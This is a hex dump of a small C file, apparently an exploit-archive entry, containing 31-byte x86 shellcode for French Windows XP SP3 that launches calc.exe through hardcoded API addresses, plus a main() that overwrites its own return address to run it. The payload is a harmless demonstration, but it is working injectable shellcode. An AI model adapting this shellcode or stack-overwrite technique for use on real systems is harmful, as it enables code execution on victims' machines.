00000000  2f 2a 0d 0a 20 7c 20 54  69 74 6c 65 3a 20 57 69  |/*.. | Title: Wi|
00000010  6e 64 6f 77 73 20 58 70  20 50 72 6f 20 53 50 33  |ndows Xp Pro SP3|
00000020  20 46 72 20 28 63 61 6c  63 2e 65 78 65 29 20 53  | Fr (calc.exe) S|
00000030  68 65 6c 6c 63 6f 64 65  20 33 31 20 42 79 74 65  |hellcode 31 Byte|
00000040  73 0d 0a 20 7c 20 54 79  70 65 3a 20 53 68 65 6c  |s.. | Type: Shel|
00000050  6c 63 6f 64 65 0d 0a 20  7c 20 41 75 74 68 6f 72  |lcode.. | Author|
00000060  3a 20 61 67 69 78 0d 0a  20 7c 20 50 6c 61 74 66  |: agix.. | Platf|
00000070  6f 72 6d 3a 20 77 69 6e  33 32 0d 0a 2a 2f 0d 0a  |orm: win32..*/..|
00000080  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
00000090  6f 2e 68 3e 0d 0a 0d 0a  63 68 61 72 20 73 68 65  |o.h>....char she|
000000a0  6c 6c 63 6f 64 65 5b 5d  20 3d 0d 0a 22 5c 78 45  |llcode[] =.."\xE|
000000b0  42 5c 78 31 30 22 20 2f  2f 6a 6d 70 20 73 68 6f  |B\x10" //jmp sho|
000000c0  72 74 20 30 78 31 32 0d  0a 22 5c 78 35 42 22 20  |rt 0x12.."\x5B" |
000000d0  2f 2f 70 6f 70 20 65 62  78 0d 0a 22 5c 78 35 33  |//pop ebx.."\x53|
000000e0  22 20 2f 2f 70 75 73 68  20 65 62 78 0d 0a 22 5c  |" //push ebx.."\|
000000f0  78 42 42 5c 78 41 44 5c  78 32 33 5c 78 38 36 5c  |xBB\xAD\x23\x86\|
00000100  78 37 43 22 20 2f 2f 6d  6f 76 20 65 62 78 2c 20  |x7C" //mov ebx, |
00000110  30 78 37 63 38 36 32 33  61 64 0d 0a 22 5c 78 46  |0x7c8623ad.."\xF|
00000120  46 5c 78 44 33 22 20 2f  2f 63 61 6c 6c 20 65 62  |F\xD3" //call eb|
00000130  78 0d 0a 22 5c 78 42 42  5c 78 46 41 5c 78 43 41  |x.."\xBB\xFA\xCA|
00000140  5c 78 38 31 5c 78 37 43  22 20 2f 2f 6d 6f 76 20  |\x81\x7C" //mov |
00000150  65 62 78 2c 20 30 78 37  63 38 31 63 61 66 61 0d  |ebx, 0x7c81cafa.|
00000160  0a 22 5c 78 46 46 5c 78  44 33 22 20 2f 2f 63 61  |."\xFF\xD3" //ca|
00000170  6c 6c 20 65 62 78 0d 0a  22 5c 78 45 38 5c 78 45  |ll ebx.."\xE8\xE|
00000180  42 5c 78 46 46 5c 78 46  46 5c 78 46 46 22 20 2f  |B\xFF\xFF\xFF" /|
00000190  2f 63 61 6c 6c 20 64 77  6f 72 64 20 30 78 32 0d  |/call dword 0x2.|
000001a0  0a 2f 2f 64 62 20 63 61  6c 63 2e 65 78 65 0d 0a  |.//db calc.exe..|
000001b0  22 5c 78 36 33 5c 78 36  31 5c 78 36 43 5c 78 36  |"\x63\x61\x6C\x6|
000001c0  33 5c 78 32 45 5c 78 36  35 5c 78 37 38 5c 78 36  |3\x2E\x65\x78\x6|
000001d0  35 22 3b 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |5";....int main(|
000001e0  69 6e 74 20 61 72 67 63  2c 20 63 68 61 72 20 2a  |int argc, char *|
000001f0  2a 61 72 67 76 29 20 7b  0d 0a 20 20 20 20 20 20  |*argv) {..      |
00000200  20 20 69 6e 74 20 2a 72  65 74 3b 0d 0a 20 20 20  |  int *ret;..   |
00000210  20 20 20 20 20 72 65 74  20 3d 20 28 69 6e 74 20  |     ret = (int |
00000220  2a 29 26 72 65 74 20 2b  20 32 3b 0d 0a 20 20 20  |*)&ret + 2;..   |
00000230  20 20 20 20 20 28 2a 72  65 74 29 20 3d 20 28 69  |     (*ret) = (i|
00000240  6e 74 29 20 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |nt) shellcode;..|
00000250  7d                                                |}|
00000251
